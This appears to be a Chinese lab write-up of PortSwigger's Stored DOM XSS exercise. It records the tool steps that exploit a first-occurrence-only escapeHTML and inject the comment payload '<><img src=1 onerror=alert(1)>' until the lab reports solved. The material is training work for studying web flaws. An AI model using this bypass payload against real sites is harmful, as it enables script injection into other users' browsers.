# lab-dom-xss-stored

- 题面：Stored DOM XSS；博客评论由 `/resources/js/loadCommentsWithVulnerableEscapeHtml.js` 渲染，`escapeHTML` 为 `html.replace('<','&lt;').replace('>','&gt;')`（字符串形各只换第一处），目标=评论被查看时弹 `alert`。
- 实例：`range_launch launch-url /web-security/cross-site-scripting/dom-based/lab-dom-xss-stored --jar /tmp/cj1.json` → `https://0a23009d0378f8a9809e03740026004e.web-security-academy.net/`，`reused:false`；不带 `--jar` 会落到 `login.portswigger.net`。
- 题页路径：`/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored`（canonical 路径直吃，无 404）。

## 过程

1. `range_launch launch-url <path> --jar /tmp/cj1.json`：得 instance_url。
2. `http_dump <base>/post?postId=1 --out`：评论区引 `<script src='/resources/js/loadCommentsWithVulnerableEscapeHtml.js'>` + `loadComments('/post/comment')`；`http_dump` 该脚本读到 escapeHTML 只替换首处 `<`/`>`，`comment.body` 经 `innerHTML` 落地。
3. `http_session get <base>/post?postId=1 --jar /tmp/domstored_jar.json`：取 `csrf`。
4. `http_session post <base>/post/comment --form csrf=.. --form postId=1 --form 'comment=<><img src=1 onerror=alert(1)>' --form name=wiener --form email=..`：302 → `/post/comment/confirmation?postId=1`。
5. `http_session get <base>/post/comment?postId=1`：JSON 中 `body` 为原文 `<><img src=1 onerror=alert(1)>`（存储侧不编码）。
6. `page_alert <base>/post?postId=1 --settle-ms 3000`：`fired:true`，`alerts:["alert:1"]`，`ready_state:complete`。
7. `banner_verdict <base>`：`solved:true`，`solved_class:true`，`<h4>Congratulations, you solved the lab!</h4>`。

## 判据

- 命中链：评论体首对 `<>` 吃掉唯一一次 `<`/`>` 替换，余下 `<img src=1 onerror=alert(1)>` 原样进 `innerHTML` → 弹窗 → 横幅 solved。
- 件组合：`range_launch` → `http_dump`（读渲染脚本）→ `http_session`（提交 + 读回 JSON 证存储）→ `page_alert`（触发判据）→ `banner_verdict`（收口）。

## 备注

- `loadComments` 以 `xhr.open("GET", postCommentPath + window.location.search)` 取评论，故评论列表 URL 的 query 决定 postId（`/post/comment?postId=1`）。
- `range_launch` 信封 `instance_url:null` 时先看 `final_url` 是否落在 `login.portswigger.net` —— 即漏传认证 jar。
- 本小局无需新件；`page_alert` 的 `fired` 即 XSS 判据。
